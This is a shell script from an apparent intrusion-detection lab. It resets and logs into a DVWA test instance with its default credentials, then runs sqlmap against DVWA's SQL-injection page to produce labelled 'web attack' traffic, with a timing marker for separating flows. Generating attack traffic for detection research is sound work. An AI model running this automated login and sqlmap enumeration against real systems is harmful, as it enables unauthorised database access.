#!/bin/sh
# Expected class: Web attack. sqlmap against DVWA (default login admin/password); --flush-session
# so every run really attacks instead of replaying the results sqlmap cached last time.
# Stops with an error if DVWA isn't set up or the login fails, so a failed run
# never produces traffic that gets labelled as a web attack.
. "$(dirname "$0")/common.sh"
CJ=$(mktemp)
trap 'rm -f "$CJ"' EXIT
fail() { echo "webattack: $*" >&2; exit 1; }
token() { curl -s -b "$CJ" -c "$CJ" "$1" | sed -n "s/.*user_token' value='\([^']*\)'.*/\1/p" | head -n 1; }
BASE="http://$DVWA_IP"

# 1. Create the database (DVWA sends logins to setup.php until it exists).
TOKEN=$(token "$BASE/setup.php")
[ -n "$TOKEN" ] || fail "no CSRF token on setup.php; is DVWA running?"
curl -s -b "$CJ" -c "$CJ" -o /dev/null \
  --data-urlencode "create_db=Create / Reset Database" -d "user_token=$TOKEN" "$BASE/setup.php"

# 2. Log in.
TOKEN=$(token "$BASE/login.php")
[ -n "$TOKEN" ] || fail "no CSRF token on login.php"
curl -s -b "$CJ" -c "$CJ" -o /dev/null \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" "$BASE/login.php"
SESSID=$(awk '$6=="PHPSESSID"{print $7}' "$CJ" | tail -n 1)
[ -n "$SESSID" ] || fail "no session cookie after login"

# 3. Check the session really reaches the target page (200, not a redirect to login).
CODE=$(curl -s -o /dev/null -w '%{http_code}' --cookie "PHPSESSID=$SESSID; security=low" \
  "$BASE/vulnerabilities/sqli/")
[ "$CODE" = 200 ] || fail "login did not work (target page returned HTTP $CODE)"

# Marker for scripts/lab_unseen.py: flows that started before this second (the setup and login curls
# above) are not sqlmap traffic. Seconds are enough: the script drops the marker second too, so
# wait 2 s before sqlmap starts; otherwise its first (keep-alive) connection, which carries many of
# its requests, starts in the marker second and is dropped.
echo "webattack: sqlmap-start $(date +%s)"
sleep 2
sqlmap -u "$BASE/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$SESSID; security=low" --batch --flush-session --level=2 --dbs
